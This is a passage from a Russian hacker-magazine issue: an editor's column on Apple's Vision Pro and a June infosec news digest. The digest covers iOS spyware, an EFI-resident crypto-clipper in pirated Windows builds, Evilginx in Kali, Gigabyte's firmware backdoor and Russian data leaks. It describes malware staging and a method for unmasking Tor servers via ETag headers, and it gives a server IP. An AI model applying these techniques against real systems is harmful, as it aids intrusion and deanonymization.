
            № 291
CONTENTS


    Увесистый шлем Apple
   Колонка главреда

    MEGANews
  Самые важные события в мире инфосека за июнь

    10 докладов с PHDays 12
  Вспоминаем выступления, записи которых стоит посмотреть

     Standoff 11
  Как прошли соревнования по взлому города

     Positive Hack Days 12
  Как хакеры наводнили парк Горького

    Важная делегация
   Эксплуатируем TGT Delegation в Active Directory

    Дырявый лист
  Как работают уязвимости в библиотеке SheetJS

    В обход стражи
  Как вскрывают приложения, защищенные аппаратным ключом Sentinel

    Жидкий хром
  Как работает баг use after free в движке Blink

    Уроки форензики
  Извлекаем артефакты из дампа памяти сервера

    HTB Bagel
  Захватываем сервер через десериализацию JSON в .NET

    HTB Escape
   Эксплуатируем типичные уязвимости Active Directory

    HTB Soccer
  Повышаем привилегии в Linux через свой плагин для doas

    HTB Stocker
  Используем генератор PDF для произвольного чтения файлов

    Шифруйся!
  Изучаем новый механизм шифрования Synology

    Воскрешению подлежит!
   Восстанавливаем файлы в NTFS с использованием PowerShell

    Увидеть сеть
  Воссоздаем схему подключений из дампа трафика

    Титры
  Кто делает этот журнал
HEADER





  УВЕСИСТЫЙ
 ШЛЕМ APPLE

         КОЛОНКА ГЛАВРЕДА





Представь: перед тобой гигантский экран,
на нем идет «Аватар» в 3D, по левую руку
открыта  почта,  по  правую  можно  пог‐
лядывать  на  «Телеграм»,  сверху  ползут
новости, обновляются биржевые котиров‐       Андрей Письменный                                                                                      Главный редактор
ки, шевелятся графики, а сам ты при этом         apismenny@gmail.com
сидишь на толчке. Таково будущее по вер‐
сии Apple, и отделяет тебя от него всего
полгода и 3500 долларов.





Слухи о том, что в Apple вот‑вот покажут шлем дополненной и виртуальной
реальности, циркулируют уже который год. Тем страннее было увидеть, что
да, действительно, вот он перед нами — ровно такой, как все себе представ‐
ляли и как рисовали на любительских рендерах.
   Если публика чем‑то шокирована, то это ценой. Сразу начались срав‐
нения: Meta Quest 3 будут продавать за 500 долларов, PS VR2 стоит 550,
даже за навороченные Quest Pro и Vive XR Elite просят не больше полутора
тысяч. А тут 3500. Не безумие ли?
  С гаджетами Apple такое постоянно: конкуренты есть, но сравнивать нап‐
рямую как‑то не выходит. У экранов Vision Pro в общей сложности 23 мил‐
лиона пикселей — в 2–3 раза больше, чем у современных шлемов. И, судя
по отзывам, это не просто понты, а разница между невозможностью и воз‐
можностью комфортно работать с текстом.





Добавь процессор десктопного калибра, безумное количество камер сна‐
ружи и внутри шлема, кастомные линзы, необычные наушники, на качество
и объемность звука которых так напирали в презентации... Еще этот экран
спереди, транслирующий глаза пользователя, будто шлем прозрачный. Пол‐
ное ощущение, что смотришь на навороченный суперкар, имеющий мало
общего с моделями, которые потом будут ездить по дороге.
   Роскошь, конечно, урежут. Вместо алюминия возьмут пластик, механичес‐
кую крутилку уберут, ремешок упростят, половину камер научатся заменять
алгоритмами; возможно, даже фронтальный экран заменят индикатором поп‐
роще. Батарейку поставят внутрь или будут цинично продавать отдельно.
И вот он, массовый продукт за 990 зеленых.
   Интересно здесь другое. Apple Vision Pro — это шлем AR/VR, на презен‐
тации которого почти не показывали виртуальную реальность и едва кос‐
нулись дополненной. Ни тебе игр, ни хотя бы каких‑нибудь безногих пучег‐
лазых аватаров на манер цукерберговских. Вместо этого бесконечные лета‐
ющие окна. Как так?





Вспоминается, как Джобс показывал первый iPhone. «Это три вещи: iPod
с большим экраном и тач‑управлением, революционный мобильный телефон
и интернет‑коммуникатор». Тим Кук не стал так же разжевывать киллер‑фичи
Vision Pro, но их легко вычислить. Это работа с документами, просмотр видео
(в том числе в стереоскопическом 3D) и общение.
   Получается, главная фишка шлема в том, что он становится «бесконеч‐
ным» экраном, заменяя штук шесть нагроможденных друг на друга мониторов
или 70-дюймовый телевизор. Меня, как человека, который в любых путешес‐
твиях возит за собой монитор, чтобы нормально работать, такое пред‐
ложение в теории должно интересовать. Но пока что только в теории.





К монитору я могу подключить что угодно — компьютер, ноутбук, планшет,
игровую приставку или даже несколько. А вот на Vision Pro в этом плане
типичная духота Apple. Никаких входов, боже упаси! Разрешается разве что
транслировать по сети экран макбука.
   Как обычный компьютер Vision Pro сомнителен и по другой причине.
Ни тебе VSCode, ни командной строки, ни «Стима» с играми. Будут доступны
только приложения с айпада. Я пробовал использовать iPad как компьютер,
даже написал  полную  энтузиазма  колонку. А потом  вернулся на  мак.
Выживать на айпаде c SSH и VS Code Server прикольно, но зачем?
   Можно надеяться, что экосистема Apple Vision окрепнет, а из AR-фрей‐
мворков родятся новые применения, о которых мы пока даже не мечтаем.
Как из «айпода с большим экраном» потом вышли неожиданные вещи вроде
заказа такси, аренды самокатов и бесконтактной оплаты.
   Vision Pro — это грандиозный фундамент. Глядя на него, можно представ‐
лять себе строения самой разной вышины и красоты. А можно разводить
руками и спрашивать: зачем кому‑то столько бетона?





Постройка, которую в Apple теперь будут возводить много лет, наверняка
разойдется с влажными мечтами, и нас еще ждут разочарованные стоны.
Vision Pro — это девайс из будущего, но мы‑то живем в настоящем.
   Компромиссы пока никуда не делись: от шлема будет уставать шея и сле‐
зиться глаза, провод станет мешать, а батарейка — садиться даже быстрее,
чем за два часа. Контента и приложений поначалу будет мало, а закрытость
быстро начнет досаждать.
   Как бы то ни было, заглянуть в будущее бывает бесценно.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: ФСБ и «Лаборатория Касперского» обна‐
ружили 0-day и таргетированные атаки на iOS, вышла новая
версия Kali Linux, сотни компаний пострадали из‑за атак
на уязвимость в MOVEit Transfer, закрылся один из крупней‐
ших торрент‑трекеров в мире, у российских компаний мас‐
сово утекли данные, а также другие интересные события
июня.
ЦЕЛЕВЫЕ АТАКИ
НА IOS





В начале июня ФСБ и ФСО России сообщили о «разведывательной акции
американских  спецслужб,  проведенной  с  использованием  мобильных
устройств фирмы Apple». Вскоре после этого «Лаборатория Касперского»
опубликовала развернутый отчет о целевых атаках, направленных на устрой‐
ства, работающие под управлением iOS.
   Эта кампания получила название «Операция „Триангуляция“» (Operation
Triangulation), и, по данным «Лаборатории Касперского», целью атак было
«незаметное внедрение шпионского модуля в iPhone  сотрудников ком‐
пании — как топ‑менеджмента, так и руководителей среднего звена». По дан‐
ным компании, эти атаки начались еще в 2019 году.
   Представители ФСБ сообщали, что «полученная российскими спецслуж‐
бами информация свидетельствует о тесном сотрудничестве американской
компании Apple с национальным разведсообществом, в частности АНБ США,
и подтверждает, что декларируемая политика обеспечения конфиденциаль‐
ности персональных данных пользователей устройств Apple не соответствует
действительности».
   Компанию Apple обвиняли в том, что она «предоставляет американским
спецслужбам широкий спектр возможностей по контролю как за любыми
лицами, представляющими интерес для Белого дома, включая их партнеров
по антироссийской деятельности, так и за собственными гражданами».
  В свою очередь, Евгений Касперский писал в блоге, что «главной при‐
чиной этого инцидента является закрытость iOS», называя операционную
систему Apple «черным ящиком», где «годами могут скрываться шпионские
программы».
   Представители Apple  отвергли эти обвинения, заявив, что компания
«никогда не работала и не будет работать с каким‑либо правительством
над внедрением бэкдора в какой‑либо продукт Apple». Позже разработчики
iOS выпустили патчи для уязвимостей CVE-2023-32434 и CVE-2023-32435,
которые представляли угрозу для всех версий iOS, вышедших до iOS 15.7.
Уязвимости были связаны с «Операцией „Триангуляция“» и описываются
как баги в ядре и в движке WebKit.
   Исследователи «Лаборатории Касперского» уже опубликовали бесплат‐
ную  утилиту  triangle_check,  которая  позволяет  найти  следы  заражения
в резервной копии устройства Apple.
   Также, почти одновременно с выходом патчей Apple, эксперты предста‐
вили анализ написанного на Objective-C вредоноса TriangleDB, который
использовался в этой кампании.
   TriangleDB загружается на устройства после того, как атакующие получают
root-права в результате успешной эксплуатации уязвимости в ядре iOS. Вре‐
донос предоставляет хакерам возможности скрытого наблюдения и работает
исключительно в памяти iOS-устройства, а его следы удаляются при перезаг‐
рузке.
   Эксперты пришли к выводу, что TriangleDB — это сложное шпионское ПО,
которое содержит широкий спектр функций для сбора данных и мониторинга.


       «Анализируя эту  атаку, мы обнаружили сложный имплант для iOS,
       у  которого  много  примечательных  особенностей. Мы  продолжаем«
      свое исследование и будем держать в курсе наших новых находок
      об этой сложной  атаке. Мы призываем сообщество специалистов
      по кибербезопасности  объединиться для обмена знаниями и  сот-
       рудничества,  чтобы получить более  четкую  картину существующих
       угроз», —  комментирует Леонид  Безвершенко, эксперт по кибер-
      безопасности «Лаборатории Касперского».                »

100 МИЛЛИАРДОВ РУБЛЕЙ СОСТАВИЛА ПРИБЫЛЬ
РОССИЙСКИХ МАЙНЕРОВ

Директор департамента финансовой политики Минфина Иван Чебесков рассказал на Петер‐
бургском экономическом форуме, что в России добывается криптовалюта примерно на 4 мил-
лиарда долларов США.

При этом прибыль майнеров составляет порядка 100 миллиардов рублей. Чебесков отме‐
тил, что при текущих условиях доходы бюджета от налогообложения отрасли могли бы сос‐
тавить около 20 миллиардов рублей, если бы майнеры вообще платили налоги.

EFI-МАЛВАРЬ В
ПИРАТСКИХ СБОРКАХ
WINDOWS





Компания «Доктор Веб» сообщила, что в пиратских сборках Windows 10 обна‐
ружен троян‑стилер, который злоумышленники распространяли через неназ‐
ванный торрент‑трекер.
   Вредонос, получивший имя Trojan.Clipper.231, подменяет в буфере обмена
адреса криптокошельков адресами, принадлежащими злоумышленникам.
На данный момент с помощью этой малвари хакерам удалось похитить крип‐
товалюту на 19 тысяч долларов США.
   Исследователи рассказали, что в конце мая 2023 года в компанию обра‐
тился клиент с подозрением на заражение компьютера под управлением ОС
Windows 10. Проведенный специалистами анализ подтвердил, что в системе
присутствуют троянские программы — стилер Trojan.Clipper.231, а также вре‐
доносные приложения Trojan.MulDrop22.7578 и Trojan.Inject4.57873, запус‐
кающие его.
  В то же время выяснилось, что целевая ОС была неофициальной сборкой
и вредоносные программы встроены в нее изначально. Дальнейшее иссле‐
дование обнаружило несколько таких зараженных сборок Windows:
 • Windows 10 Pro 22H2 19045.2728 + Office 2021 x64 by BoJlIIIebnik RU.iso;
 • Windows 10 Pro 22H2 19045.2846 + Office 2021 x64 by BoJlIIIebnik RU.iso;
 • Windows 10 Pro 22H2 19045.2846 x64 by BoJlIIIebnik RU.iso;
 • Windows 10 Pro 22H2 19045.2913 + Office 2021 x64 by BoJlIIIebnik [RU,
   EN].iso;
 • Windows 10 Pro 22H2 19045.2913 x64 by BoJlIIIebnik [RU, EN].iso.

Все они были доступны для скачивания на неназванном торрент‑трекере,
однако исследователи не исключают, что злоумышленники использовали
и другие сайты для распространения вредоносных образов.
   Малварь в этих сборках расположена в системном каталоге:
 • \Windows\Installer\iscsicli.exe (Trojan.MulDrop22.7578);
 • \Windows\Installer\recovery.exe (Trojan.Inject4.57873);
 • \Windows\Installer\kd_08_5e78.dll (Trojan.Clipper.231).

Стилер инициализируется в несколько стадий. На первом этапе через сис‐
темный    планировщик    задач     запускается    Trojan.MulDrop22.7578:
%SystemDrive%\Windows\Installer\iscsicli.exe.
   Задача вредоноса — смонтировать системный EFI-раздел на диск M:\,
скопировать на него два других компонента, после чего удалить оригиналы
троянских файлов с диска C:\, запустить Trojan.Inject4.57873 и размонти‐
ровать EFI-раздел.
  В свою очередь, Trojan.Inject4.57873 с использованием техники Process
Hollowing  внедряет  Trojan.Clipper.231  в  системный  процесс  %WINDIR%\
System32\Lsaiso.exe, после чего стилер начинает работать в его контексте.
   Получив управление, Trojan.Clipper.231 приступает к отслеживанию буфера
обмена и подменяет скопированные адреса криптокошельков адресами,
заданными хакерами. Однако отмечается, что у вредоноса есть ряд огра‐
ничений. Во‑первых, выполнять подмену он начинает только при наличии сис‐
темного файла %WINDIR%\INF\scunown.inf. Во‑вторых, троян проверяет
активные процессы. Если он обнаруживает процессы опасных для него при‐
ложений, то адреса криптокошельков не подменяет.
   Исследователи сообщают, что внедрение малвари в EFI-раздел компь‐
ютеров по‑прежнему встречается весьма редко. Поэтому выявленный случай
представляет большой интерес для ИБ‑специалистов.
  По подсчетам аналитиков, на момент публикации отчета с помощью
Trojan.Clipper.231 было украдено 0,73406362 BTC и 0,07964773 ETH, что экви‐
валентно сумме 18 976 долларов США или 1 568 233 рублям.


ПОСЛЕДСТВИЯ ЛИКВИДАЦИИ ENCROCHAT

В 2020 году европейские правоохранители ликвидировали платформу для зашифрованных
коммуникаций EncroChat, которой пользовались более 60 000 преступников по всему миру.

Как теперь рассказали в Европоле, с 2020 года правоохранители Франции и Нидерландов, сов‐
местно с коллегами в других странах, арестовали 6558 человек, которые были пользователями
EncroChat. При этом 197 из них находились в списке особо важных целей.

Используя собранные в EncroChat данные, власти конфисковали у подозреваемых более 270
тонн наркотических веществ (включая героин, кокаин и каннабис), 971 автомобиль, 271 объект
недвижимости, 923 единицы оружия, 68 единиц взрывчатых веществ, 40 самолетов и 83
катера.





Также в руки правоохранительных органов перешли 810 000 000 долларов наличными, а еще
168 000 000 долларов были заморожены на различных счетах.

Большинство пользователей EncroChat имели отношение либо к организованной преступности
(34,8%), либо к торговле наркотиками (33,3%).

Остальные занимались отмыванием денег (14%), убийствами (11,5%) и торговлей огнестрель‐
ным оружием (6,4%).





В общей сложности бывшие пользователи EncroChat были приговорены к 7134 годам лишения
свободы, но отмечается, что пока вынесены далеко не все приговоры.

ВЫШЛА KALI LINUX
2023.2 С 13 НОВЫМИ
ИНСТРУМЕНТАМИ





Компания Offensive Security представила Kali Linux 2023.2, вторую версию
дистрибутива в 2023 году. Теперь Kali содержит готовый образ Hyper-V и три‐
надцать новых инструментов, включая фреймворк Evilginx для кражи учетных
данных и cookie сеансов.
   Одним из наиболее заметных обновлений в этом выпуске стал pre-built-
образ Hyper-V, настроенный для Enhanced Session Mode, что позволяет под‐
ключаться к виртуальной машине с помощью RDP. Новый образ Hyper-V уже
можно загрузить с kali.org, после чего останется распаковать и запустить
извлеченный скрипт install-vm.bat.


      «Ранее включение Enhanced  Session Mode  требовало совершения
       определенных действий вручную, как в Windows, так и в виртуальной«
     машине  Kali, и это было не очень просто, — объясняют разработ-
       чики. —  Надеемся,  что  новые  образы  обеспечат  лучший  опыт
      для  пользователей  Hyper-V. По  сути,  теперь  никакой  настройки
      не требуется».                »
Использование Enhanced  Session Mode  упрощает  изменение  размера
рабочего стола и совместное использование на виртуальной машине Kali
Linux локальных устройств, включая USB-накопители, принтеры и прочее обо‐
рудование.





Также в этой версии появилось тринадцать новых инструментов:
 • Cilium-cli — установка, управление и устранение неполадок в кластерах
   Kubernetes;
 • Cosign — подпись контейнеров;
 • Eksctl — официальный CLI для Amazon EKS;
 • Evilginx — автономный механизм для атак man in the middle, используемый
   для фишинга учетных данных и cookie сеансов, что позволяет обойти двух‐
   факторную аутентификацию;
 • Gophish — опенсорсный тулкит для фишинга;
 • Humble — быстрый анализатор HTTP-заголовков;
 • Slim (toolkit) — уменьшение образа контейнера без каких‑либо изменений;
 • Syft — генерация софтверного Bill of Materials из образов контейнеров
   и файловых систем;
 • Terraform — безопасное и предсказуемое создание, изменение и улуч‐
  шение инфраструктуры;
 • Tetragon — решение, основанное на eBPF, для обеспечения наблюда‐
   емости и регулирования среды выполнения;
 • TheHive — масштабируемая опенсорсная платформа для реагирования
   на инциденты;
 • Trivy — поиск уязвимостей, неправильной конфигурации, секретов, SBOM
   в контейнерах, Kubernetes, репозиториях кода, облаках и так далее;
 • WsgiDAV — расширяемый WebDAV-сервер на основе WSGI.

Кроме того, в этой версии Kali Linux появилась новая звуковая подсистема,
в которой разработчики заменили PulseAudio PipeWire. Команда отмечает,
что PipeWire — это современный аудиосервер для Linux, обеспечивающий
уменьшенную задержку, расширенную поддержку Bluetooth и многое другое.
Хотя Xfce исходно не поддерживает PipeWire, разработчики говорят, что
использовали демон pipewire-pulse, позволяя приложениям, разработанным
для PulseAudio, работать с PipeWire.
   Также нужно отметить, что Kali Linux 2023.2 содержит обновления и фун‐
кции для Xfce и GNOME. Так, в Xfce добавлено расширение GtkHash, позволя‐
ющее щелкнуть правой кнопкой мыши по файлу и выбрать хеш‑функции,
которые нужно использовать для вычисления хеша файла.





В свою очередь, GNOME был обновлен до версии 44 и теперь содержит
обновленную тему  Kali, новое приложение  Settings и миниатюры изоб‐
ражений в окне выбора файлов. Также команда Kali добавила в GNOME
нового Tiling Assistant и дополнительные функции UI.
   Чтобы начать использование Kali Linux 2023.2, можно, например, обновить
текущую  установку, выбрав нужную платформу, или напрямую  загрузить
с официального сайта образы ISO.


ЗА ИСПОЛЬЗОВАНИЕ VPN НЕ НУЖНО ПРИВЛЕКАТЬ
К ОТВЕТСТВЕННОСТИ





На ПМЭФ-2023 глава комитета Госдумы по информполитике Александр Хинштейн рассказал,
что работа по осуществлению концепции цифрового суверенитета России «спокойно и пос‐
тупательно реализуется на протяжении последних лет». Также он высказался об использовании
VPN-сервисов, заявив, что не согласен с мнением тех, кто считает, что за обход блокировок
нужно наказывать.

           «Поначалу многие смеялись, ставили под сомнение возможность российско‐→       го государства обеспечить дальнейшее функционирование интернета в авто‐
       номном режиме. Прошло всего‑навсего четыре года, и мы видим, что система
        работает. Да, у нас продолжают функционировать VPN-сервисы, но я не под‐
       держиваю предложение кого‑то из коллег, что их использование надо прирав‐
       нять к госизмене. Обходы блокировок все равно не носят массового характера,
       основная часть нашего общества населения ими не будет по разным причинам
        пользоваться. И очевидно, что сегодня работа суверенного безопасного рунета
       себя полностью оправдала, а  установленное оборудование нам  позволяет
        реализовывать те законодательные меры, которые мы принимаем», — сообщил
       Хинштейн.





                                     Продолжение статьи →
← Начало статьи
 ДЕАНОН TOR-
 СЕРВЕРОВ
 ЧЕРЕЗ ETAG





   ИБ‑специалист, известный под ником Sh1ttyKids, показал способ выявления
   реальных IP-адресов серверов Tor. Исследователь использовал для этого
  ETag (entity tag) в заголовке HTTP-ответов.
     Свое исследование Sh1ttyKids начал в  связи со взломом компании
  Capcom, которую еще в 2020 году скомпрометировала вымогательская груп‐
   пировка Ragnar Locker. Так как Capcom отказалась платить выкуп, око‐
  ло 67 Гбайт украденных файлов были опубликованы в даркнете.
      Тогда на сайте группировки приводилась только ссылка на утечку, но не
  сами файлы, и Sh1ttyKids заметил, что существует отдельный Onion-адрес
  для размещения таких сливов Ragnar Locker. Так, файлы были размещены
  на Onion-адресе, начинающемся на «t2w…», как показано на скриншоте ниже.





   Попытка прямого доступа к этому адресу приводила на пустую страницу. Тог‐
  да исследователь подумал о том, что при поиске IP-адресов даркнет‑сайтов
   обычно проверяется исходный код сайта, SSL-сертификат, заголовки ответов
  и так далее. Это делается для того, чтобы получить уникальные строки и фин‐
   герпринтинг, которые затем можно использовать в Shodan, Censys и других
   аналогичных сервисах для обнаружения реального IP-адреса ресурса. Одна‐
   ко исходный код сайта в данном случае получить не удалось.
      Тогда Sh1ttyKids проверил хедеры ответов, ведь, если они содержат уни‐
   кальную строку, их можно использовать для получения IP-адреса источника.
  В итоге исследователь пришел к выводу, что даже ETag в хедере ответа тоже
  может принести пользу. Через Shodan он поискал полученный от сайта
  Ragnar Locker ETag «0–5a4a8aa76f2f0» и нашел одно совпадение.
    При попытке получить доступ к этому IP-адресу напрямую обнаруживалась
  лишь пустая страница, точно так же, как и при прямом доступе к адресу
  t2w5by<…>.onion. Однако, проверив заголовки ответа, исследователь обна‐
  ружил тот же самый ETag. Затем Sh1ttyKids попытался загрузить файл с оди‐
   наковым именем с Onion-адреса и по IP-адресу и убедился, что файл обна‐
   руживается в обоих случаях.
      Таким образом, исследователь пришел к выводу, что исходный IP-адрес
   Onion-сайта t2w5by<…>.onion — это 5.45.65(.)52.





   Эксперт  отмечет,  что  такая  информация может  пригодиться  правоох‐
   ранительным органам, ведь знание IP-адреса потенциально может помочь
  им захватить сервер и использовать его в расследовании.


 В 2022 ГОДУ ПРОДАНО FLIPPER ZERO
  НА 25 МИЛЛИОНОВ ДОЛЛАРОВ

    Разработчики «хакерского тамагочи» Flipper Zero сообщили, что в 2022 году им удалось реали‐
   зовать устройства на общую сумму 25 000 000 долларов США. В текущем 2023 году компания
   и вовсе планирует выручить 80 000 000 за свои гаджеты.

    Хотя в компании не сообщили, сколько именно устройств было продано на текущий момент,
   журналисты издания TechCrunch подсчитали, что речь идет примерно о 300 000 Flipper Zero,
   так как один девайс стоит 169 долларов США.

 GIGABYTE
 УСТРАНИЛА БЭКДОР
 В МАТПЛАТАХ





   Разработчики Gigabyte обновили прошивку 270 моделей материнских плат,
   чтобы устранить недавно обнаруженную уязвимость. Исследователи, нашед‐
  шие этот баг, посчитали его бэкдором, который мог использоваться для уста‐
   новки вредоносных программ.
   О проблеме заявили эксперты компании Eclypsium, специализирующейся
  на безопасности прошивок и оборудования. Исследователи определили, что
   прошивка многих материнских плат Gigabyte содержит Windows-бинарник,
  который выполняется при загрузке операционной системы. Затем этот файл
   загружает и запускает другую полезную нагрузку, полученную с серверов
   Gigabyte.
      Отмечалось, что пейлоад загружается через небезопасное соединение
  (HTTP или неправильно настроенный HTTPS) и легитимность файла никак
  не  проверяется. То есть хакеры могут  воспользоваться незащищенным
   соединением между системой и серверами Gigabyte,  чтобы подменить
   полезную нагрузку и реализовать атаку типа man in the middle.
     К своему отчету Eclypsium приложила список более чем 270 моделей
   материнских плат Gigabyte, затронутых проблемой. Эксперты резюмировали,
   что бэкдор, вероятно, присутствует на миллионах устройств.
      Вскоре инженеры Gigabyte сообщили, что проблема устранена. Ошибка
  была связана с функцией Windows Platform Binary Table (WPBT), которая поз‐
   воляет  разработчикам прошивок  автоматически  извлекать исполняемый
  файл из образа и запускать его в операционной системе.


       «WPBT позволяет поставщикам и OEM-производителям запускать .exe-
         программу на уровне UEFI. Каждый раз, когда Windows загружается, «
        она просматривает UEFI и запускает .exe», — поясняется в докумен-
         тации Microsoft.                 »
   Материнские платы Gigabyte используют функцию WPBT при установке при‐
   ложения  для  автоматического  обновления  в  %SystemRoot%\system32\
  GigabyteUpdateService.exe в новых  установках Windows. Эта функция
   включена по умолчанию, ее можно отключить в настройках BIOS.
    В итоге производитель выпустил обновления прошивки материнских плат
  для процессоров  Intel (серии 400, 500, 600, 700) и процессоров AMD
  (серии 400, 500, 600). Патч добавляет более строгие проверки безопасности
  во время запуска системы, включая улучшенную проверку файлов, загружа‐
  емых с удаленных серверов, и их подписи, а также стандартную проверку сер‐
   тификатов для удаленных серверов.
    По информации компании, эти  усовершенствования  воспрепятствуют
  внедрению вредоносного кода и гарантируют, что любые загружаемые файлы
   поступают с серверов с действительными и надежными сертификатами.


  STACK OVERFLOW СОБРАЛ СТАТИСТИКУ 2023 ГОДА
   Популярный ресурс Stack Overflow провел традиционный ежегодный опрос среди своих поль‐
   зователей. В общей сложности в голосовании приняли участие более 90 000 человек, которые
    рассказали, как они учатся и повышают свой уровень, а также какие инструменты используют
   и какие хотели бы использовать.


   Три самые популярные среди профессиональных разработчиков технологии остались такими
   же, как и в прошлом году: JavaScript, HTML/CSS и SQL.

   JavaScript удерживает пальму первенства уже одиннадцать лет подряд и используется чаще
    других языков программирования среди всех опрошенных.





  Python в этом году обогнал SQL и стал третьим по популярности. При этом он же занял пер‐
   вое место среди опрошенных не профессиональных разработчиков.


    Также в этом году Stack Overflow подсчитал, сколько респондентов собираются и хотят исполь‐
   зовать какую‑то технологию и сколько уже пользовались ею и намерены продолжать. Здесь
   бесспорным лидером оказался Rust, которым хотят пользоваться 30,5% и уже используют
   и довольны 84,66% респондентов.





   Список наиболее часто используемых инструментов возглавил Docker, с которым работают
    почти 52% опрошенных.





 МАССОВЫЙ СЛИВ
 ДАННЫХ
 РОССИЙСКИХ
 КОМПАНИЙ





  В начале июня хакеры из группировки NLB пообещали опубликовать в откры‐
  том доступе данные двенадцати крупных российских компаний. К сожалению,
   злоумышленники сдержали свое слово.
      Хакеры выложили в открытый доступ базы данных с информацией о кли‐
   ентах торговых сетей «Ашан» и «Твой Дом». И в результате в сеть попали дан‐
  ные 7,8 миллиона клиентов «Ашана» и около 700 тысяч клиентов гипермарке‐
   тов «Твой Дом».
      Торговая сеть «Ашан» подтвердила сведения об утечке данных своих кли‐
   ентов. В компании проводят внутреннее расследование.


         «Служба информационной безопасности „Ашан ритейл Россия“ под-
          твердила утечку данных клиентов торговой сети. В настоящий момент «
       мы проводим внутреннее расследование с целью установления век-
         тора атаки и источника утечки. Мы сожалеем о случившемся и при-
        носим извинения нашим клиентам», — сообщили в пресс‑службе
          ретейлера.                 »
  На следующий день после этого группировка обнародовала данные клиентов
  сети магазинов одежды «Глория Джинс», а также магазина матрасов «Аско‐
  на» и книжного интернет‑магазина book24.ru. Опубликованные дампы содер‐
  жали от 2 до 4 миллионов строк.
    В «Эксмо‑АСТ» сообщили, что уже проводят расследование по факту утеч‐
   ки данных магазина издательской группы (Book24). Также рассматривается
   возможность обращения к правоохранительным органам. Группа компаний
   «Аскона» также начала внутреннюю проверку из‑за утечки данных клиентов.
      Появившаяся вскоре третья партия данных содержала информацию о кли‐
   ентах книжного интернет‑магазина «Буквоед», интернет‑магазина одежды
   «Твое», интернет‑магазина «Леруа Мерлен» и сайта кулинарных рецептов
   edimdoma.ru.
    В итоге этот массовый слив завершился публикацией информации с сай‐
   тов «Читай‑город» и «Эксмо», издательства «АСТ» и курорта «Роза Хутор».
  В этом случае дампы насчитывали от 500 тысяч до 9 миллионов строк.
    По информации исследователей, данные перечисленных выше компаний
   слили те же злоумышленники, которые ранее публиковали дампы «СберСпа‐
   сибо», «СберПрава», «СберЛогистики», GeekBrains и другие.


  1 ИЗ 5 РОССИЯН ХОТЬ РАЗ ТРОЛЛИЛ МОШЕННИКОВ
   Согласно опросу, проведенному «Лабораторией Касперского» в марте 2023 года, каждый
  пятый респондент в России хотя бы раз пробовал троллить телефонных или онлайн‑мошен‐
   ников. При этом мужчины поступали подобным образом чаще женщин — 26,5% против 14,5%.

    Почти каждый десятый (8%) опрошенный ругался со злоумышленниками, еще 6% — унижали
    их, а 4% разговаривали с ними о жизни. Еще 2% респондентов пытались уговорить злоумыш‐
   ленников перестать заниматься мошенничеством.

 ЗАКРЫЛСЯ ОДИН
 ИЗ КРУПНЕЙШИХ
 ТОРРЕНТ-
 ТРЕКЕРОВ В МИРЕ





  О закрытии неожиданно объявил один из крупнейших и старейших тор‐
   рент‑трекеров в мире — RARBG, действовавший с 2008 года. После пят‐
   надцати лет работы команда попрощалась с пользователями и объяснила,
   что COVID-19, рост цен на электроэнергию и специальная военная операция
   сделали дальнейшее существование проекта невозможным.
      Закрытие RARBG многие назвали «концом эпохи», так как сам трекер был
  связующим звеном между пиратской сценой и конечными потребителями
   контента. Его закрытие стало крупнейшим событием такого рода с 2016–
  2017 годов, то есть со времен, когда со сцены ушли KickassTorrents, Torrentz
  и ExtraTorrent.
     Уход RARBG с его огромным, тщательно упорядоченным и постоянно
   пополнявшимся каталогом фильмов и сериалов, доступных в различном
   качестве и в различных размерах, может оказать серьезное влияние на дру‐
   гие трекеры. К тому же RARBG одним из первых, еще до активного развития
   стримингов и легальных сервисов, серьезно занялся каталогизацией суб‐
   титров для фильмов и сериалов, за что его ценили слабослышащие и говоря‐
  щие на разных языках пользователи.
    На главной странице всех зеркал сайта появилось сообщение, в котором
   команда трекера попрощалась с пользователями и объяснила, почему при‐
  няла такое решение:

          «Привет, народ.
      Мы хотели бы сообщить, что приняли решение закрыть сайт. «
         Последние два года были очень тяжелыми для нас — некоторые люди
         из нашей команды умерли из‑за осложнений, связанных с корона-
          вирусом, другие до сих пор страдают от его побочных эффектов
        и вообще не могут работать. Также некоторые воюют в Европе —
       ПО ОБЕ СТОРОНЫ (конфликта).
         Кроме того, по нам сильно ударило повышение цен на электроэнер-
        гию и дата‑центры в Европе. Инфляция сделала наши каждодневные
         расходы неподъемными.
       В  связи  с  этим  мы  больше  не  можем  поддерживать  сайт
        без огромных  затрат, которые больше не в состоянии покрывать
         из своего кармана.
        На голосовании мы единогласно решили, что больше не можем этого
         делать.
       Нам жаль :(
           Пока».                 »





                            Оригинал прощального послания



                                        Продолжение статьи →
← Начало статьи

   Судя по всему, сообщество уже пытается спасти архивы и контент RARBG.
   Так, на GitHub появился репозиторий с magnet-ссылками, охватывающий
  более 267 тысяч раздач. Файл moviesrarbg.txt содержит ссылки, относящиеся
   к фильмам, и включает 117 233 релиза. Еще два файла — showsrarbg.txt
  и showothers.txt — по‑видимому, содержат ссылки, связанные с телешоу
  и сериалами, которые выкладывали RARBG. Первый файл насчитывает 12 969
   magnet-ссылок, а второй — 137 669.
      Проверять валидность и работоспособность этих magnet-ссылок, пред‐
   положительно связанных с пиратским контентом, было бы незаконно в боль‐
   шинстве стран мира. Однако проверить ссылки без загрузки и раздачи кон‐
   тента все же возможно (например, можно использовать проект TorrentParts).
   Полученные таким способом метаданные свидетельствуют о том, что ссылки
  из файлов связаны именно с заявленными материалами.


 БЕЗОПАСНЫЙ РУНЕТ





   По данным СМИ, до конца текущего года в России запустят пилотный проект защищенного
   интернета, в который смогут попасть только граждане страны по персональному идентифика‐
   тору. В этой сети будут доступны только безопасные, проверенные сервисы, владельцы
   которых исполняют все требования действующего законодательства.
       Зампред комитета Госдумы по информационной политике, информационным технологиям
   и связи Андрей Свинцов рассказал, что нужно «поменять технологию интернета», чтобы сеть
    стала «абсолютно прозрачной» и в нее нельзя было заходить с различных «анонимных устрой‐
    ств».
       Так, пользователю нужно будет зарегистрироваться по паспорту, получить личный иден‐
   тификатор — и далее из любой точки мира можно будет войти в «защищенную часть интерне‐
    та». Благодаря этому спецслужбы смогут легко «найти того, кто владеет этим аккаунтом».

              «Главной целью является обеспечение безопасности граждан. Обеспечение →            сохранности их персональных данных, защита от спам‑рассылок, от мошен‐
            ничества, от сайтов, которые называются фишинговыми, то есть воруют денеж‐
         ные средства путем подмены получателя или дублирования страниц популярных
            сайтов.
              Главное — чтобы эти технологии были безопасны и не содержали закладок,
          которые позволят нашим противникам вскрывать защищенную часть интернета
